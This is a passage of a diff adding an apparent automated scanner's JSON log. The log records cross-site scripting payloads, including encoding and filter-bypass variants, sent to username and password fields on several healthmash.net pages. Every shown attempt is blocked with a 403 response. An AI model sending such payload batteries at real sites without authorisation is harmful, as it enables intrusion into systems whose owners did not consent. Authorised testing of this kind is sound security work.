+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.678210"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.691410"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.704008"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.716280"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.729815"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.742401"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.755508"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.768159"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.781204"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.794206"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.806206"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.819168"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.832319"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.844562"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.857633"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.870837"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.883867"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.897493"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.910239"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.923089"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.936263"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.527091"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.538573"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.548795"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.558835"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.569731"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.580845"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.593848"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.604565"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.615858"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.629927"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.640985"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.652360"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.663525"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.673737"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.683912"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.694767"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.704905"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.715040"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.725394"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.737837"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.748377"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.758865"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.769318"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.779531"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.790910"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.801082"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.811155"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.822153"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.833005"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.843773"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.855176"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.866725"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.878084"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.889499"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.901190"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.912027"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.922780"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.934378"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.945946"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.957277"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.968712"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.980053"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:05.991383"
+    },
+    {
+      "url": "http://healthmash.net/profile.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:06.004908"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.566320"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.576623"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.587184"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.597104"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.607906"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.617841"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.628810"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.639994"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.652270"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.664645"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.675257"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.686626"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.697450"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.708306"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.718607"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.729073"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.739545"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.750088"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.761876"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.772459"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.783738"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.794061"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.804390"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.814697"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.825115"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.835536"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.846534"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.857966"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.869612"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.880625"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.892037"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.903865"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.913084"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.922449"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.931995"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.942278"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.952204"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.962986"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.982027"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:08.991212"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:09.000615"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:09.010378"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:09.021376"
+    },
+    {
+      "url": "http://healthmash.net/new_post.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:09.031540"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.457112"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.468272"
+    },
+    {
